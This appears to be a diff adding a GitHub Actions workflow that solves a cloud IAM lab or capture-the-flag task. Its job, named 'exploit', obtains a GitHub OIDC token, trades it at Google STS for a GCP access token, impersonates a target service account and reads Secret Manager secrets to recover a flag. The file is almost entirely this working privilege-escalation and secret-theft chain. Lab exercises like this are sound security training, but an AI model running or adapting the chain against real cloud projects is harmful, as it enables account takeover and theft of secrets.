@@ -1,0 +1,72 @@
+name: gh-oidc-gcp
+
+on:
+  push:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC Token
+        id: oidc
+        run: |
+          echo "Requesting GitHub OIDC token"
+          TOKEN_JSON=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/projects/263429482138/locations/global/workloadIdentityPools/iam-lab-7-gh-pool/providers/iam-lab-7-gh-pool-oidc-provider")
+          echo "$TOKEN_JSON" > oidc.json
+          echo "OIDC=$(jq -r '.value' oidc.json)" >> $GITHUB_ENV
+
+      - name: Exchange OIDC for GCP Access Token
+        run: |
+          cat > sts.json <<EOF
+          {
+            "audience": "//iam.googleapis.com/${PROVIDER_PATH}",
+            "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
+            "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
+            "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
+            "subjectToken": "${OIDC}",
+            "scope": "https://www.googleapis.com/auth/cloud-platform"
+          }
+          EOF
+
+          ACCESS=$(curl -s https://sts.googleapis.com/v1/token \
+            -H "Content-Type: application/json" \
+            -d @sts.json | jq -r '.access_token')
+
+          echo "ACCESS_TOKEN=$ACCESS" >> $GITHUB_ENV
+
+      - name: Impersonate Target Service Account
+        run: |
+          SA_TOKEN=$(curl -s \
+            -H "Authorization: Bearer $ACCESS_TOKEN" \
+            -H "Content-Type: application/json" \
+            -X POST \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA}:generateAccessToken" \
+            -d '{
+              "scope": ["https://www.googleapis.com/auth/cloud-platform"]
+            }' | jq -r '.accessToken')
+
+          echo "SA_TOKEN=$SA_TOKEN" >> $GITHUB_ENV
+
+      - name: Read Secrets (Flag)
+        run: |
+          curl -s \
+            -H "Authorization: Bearer $SA_TOKEN" \
+            "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets" \
+            | jq -r '.secrets[].name'
+
+          # flag가 들어있는 secret 버전 읽기 (latest 가정)
+          SECRET_NAME=$(curl -s \
+            -H "Authorization: Bearer $SA_TOKEN" \
+            "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets" \
+            | jq -r '.secrets[0].name')
+
+          curl -s \
+            -H "Authorization: Bearer $SA_TOKEN" \
+            "${SECRET_NAME}/versions/latest:access" \
+            | jq -r '.payload.data' | base64 -d
